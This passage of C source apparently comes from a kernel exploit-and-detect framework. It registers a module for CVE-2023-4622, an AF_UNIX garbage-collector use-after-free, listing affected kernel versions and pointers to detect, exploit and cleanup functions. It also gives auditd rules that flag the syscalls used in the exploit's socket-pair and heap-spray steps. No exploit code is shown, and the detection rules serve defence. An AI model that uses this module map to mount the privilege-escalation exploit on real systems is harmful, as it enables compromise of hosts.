    "-a always,exit -F arch=b64 -S socketpair -F a0=0x1 -k skeletonkey-afunixgc-pair\n"
    "-a always,exit -F arch=b64 -S sendmsg    -k skeletonkey-afunixgc-sendmsg\n"
    "-a always,exit -F arch=b64 -S msgsnd     -k skeletonkey-afunixgc-spray\n";

const struct skeletonkey_module af_unix_gc_module = {
    .name           = "af_unix_gc",
    .cve            = "CVE-2023-4622",
    .summary        = "AF_UNIX garbage-collector race UAF (Lin Ma) — kmalloc-512 slab UAF",
    .family         = "af_unix",
    .kernel_range   = "K < 6.5; backports: 4.14.326 / 4.19.295 / 5.4.257 / 5.10.197 / 5.15.130 / 6.1.51",
    .detect         = af_unix_gc_detect,
    .exploit        = af_unix_gc_exploit,
    .mitigate       = NULL,
    .cleanup        = af_unix_gc_cleanup,
    .detect_auditd  = af_unix_gc_auditd,
    .detect_sigma   = NULL,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void skeletonkey_register_af_unix_gc(void)
{
    skeletonkey_register(&af_unix_gc_module);
}
